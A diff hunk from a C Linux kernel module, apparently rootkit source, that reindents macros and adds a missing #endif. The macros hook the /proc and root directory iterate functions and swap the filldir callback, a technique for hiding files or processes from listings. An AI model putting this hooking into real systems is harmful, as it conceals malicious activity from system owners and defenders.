@@ -24,24 +24,25 @@ static int (*root_filldir)(struct dir_context *, const char *, int, loff_t, u64,
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
 static int (*proc_iterate)(struct file *file, void *dirent, filldir_t filldir);
 static int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);
-#define ITERATE_NAME readdir
-#define ITERATE_PROTO struct file *file, void *dirent, filldir_t filldir
-#define FILLDIR_VAR filldir
-#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC) \
+#   define ITERATE_NAME readdir
+#   define ITERATE_PROTO struct file *file, void *dirent, filldir_t filldir
+#   define FILLDIR_VAR filldir
+#   define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC) \
 {                                                   \
     ret = ITERATE_FUNC(file, dirent, &FILLDIR_FUNC);\
 }
 #else
 static int (*proc_iterate)(struct file *file, struct dir_context *);
 static int (*root_iterate)(struct file *file, struct dir_context *);
-#define ITERATE_NAME iterate
-#define ITERATE_PROTO struct file *file, struct dir_context *ctx
-#define FILLDIR_VAR ctx->actor
-#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC) \
+#   define ITERATE_NAME iterate
+#   define ITERATE_PROTO struct file *file, struct dir_context *ctx
+#   define FILLDIR_VAR ctx->actor
+#   define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC) \
 {                                                   \
     *((filldir_t *)&ctx->actor) = &FILLDIR_FUNC;    \
     ret = ITERATE_FUNC(file, ctx);                  \
 }
+#endif
 
 struct s_proc_args
 {
